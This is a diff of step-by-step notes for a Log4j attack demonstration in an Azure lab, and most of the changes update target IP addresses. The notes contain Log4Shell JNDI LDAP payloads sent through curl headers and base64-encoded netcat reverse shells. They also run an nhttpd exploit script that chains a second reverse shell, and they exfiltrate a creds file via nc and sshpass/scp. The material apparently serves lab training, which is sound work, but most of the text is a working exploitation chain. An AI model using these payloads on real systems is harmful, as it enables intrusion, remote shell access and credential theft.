@@ -72,6 +72,8 @@ spec:
         - containerPort: 8080
 
 
+az aks update -n aks-cluster-1 -g LOG4J-ATTACK-DEMO --attach-acr imagerepository01.azurecr.io
+
 az aks get-credentials -g LOG4J-ATTACK-DEMO -n aks-cluster-01
 kubectl apply -f webapp.yml
 kubectl get pods
@@ -79,9 +81,9 @@ kubectl get pods
 Open Bash check IP
 kubectl exec --stdin --tty webapp-xxxxxxx -- /bin/bash
 
-kubectl exec --stdin --tty webapp-6c9775d7f8-gldwn -- /bin/bash
+kubectl exec --stdin --tty webapp-6c9775d7f8-5gdq6 -- /bin/bash
 
-10.1.2.51
+10.1.2.52
 
 SRV-UB-02 (Victim)
 ==================
@@ -138,7 +140,7 @@ Attack Steps
 SRV-UB-01 (Attacker)
 =====================
 
-webapp-IP= 10.1.2.51
+webapp-IP= 10.1.2.52
 SRV-UB-01-IP= 10.1.1.4
 SRV-UB-02-IP= 10.1.0.4
 
@@ -169,10 +171,10 @@ Create base64 encoded string for below command
 nc -nv 10.1.1.4 443 -e /bin/bash
 Copy replace XXXX with base64 output
 
-curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/XXXXXX}'
+curl 10.1.2.52:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/XXXXXX}'
 bmMgLW52IDEwLjEuMS40IDQ0MyAtZSAvYmluL2Jhc2g=
 
-curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQ0MyAtZSAvYmluL2Jhc2g=}'
+curl 10.1.2.52:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQ0MyAtZSAvYmluL2Jhc2g=}'
 
 
 go back to first putty session and check incomming session
@@ -227,10 +229,10 @@ Create base64 encode for below command
 nc -nv 10.1.1.4 4343 -e /bin/bash
 Copy replace XXXX with base64 output
 
-curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/XXXXXX}'
+curl 10.1.2.52:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/XXXXXX}'
 bmMgLW52IDEwLjEuMS40IDQzNDMgLWUgL2Jpbi9iYXNo
 
-curl 10.1.2.51:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQzNDMgLWUgL2Jpbi9iYXNo}'
+curl 10.1.2.52:8080 -H 'X-Api-Version: ${jndi:ldap://10.1.1.4:1389/Basic/Command/Base64/bmMgLW52IDEwLjEuMS40IDQzNDMgLWUgL2Jpbi9iYXNo}'
 
 go back to the putty session waiting for sessions on port 4343 and check for an incomming sessions
 
@@ -244,7 +246,7 @@ stty raw -echo;fg
 
 In the new reverse shell connection run:
 
-python ./nhttpd-exploit.py 10.1.0.4 8080 'ncat -nv 10.1.2.51 443 -e /bin/bash'
+python ./nhttpd-exploit.py 10.1.0.4 8080 'ncat -nv 10.1.2.52 443 -e /bin/bash'
 
 now start an nc to listen for incomming files
 
@@ -264,7 +266,7 @@ Do NOT use CTLZ-Z this time!
 In the reverse shell connection from SRV-UB-02 run the following to exfiltrade the target creds file
 
 cd /tmp
-nc -w 3 10.1.2.51 443 < creds
+nc -w 3 10.1.2.52 443 < creds
 
 
 WebApp (Victim)
@@ -278,5 +280,4 @@ Oneline command example
 apk add sshpass (requiered to pass password in command)
 
 sshpass -p 'XXXXX' scp -o "StrictHostKeyChecking no" /creds sdr@10.1.1.4:/tmp/creds
-
 
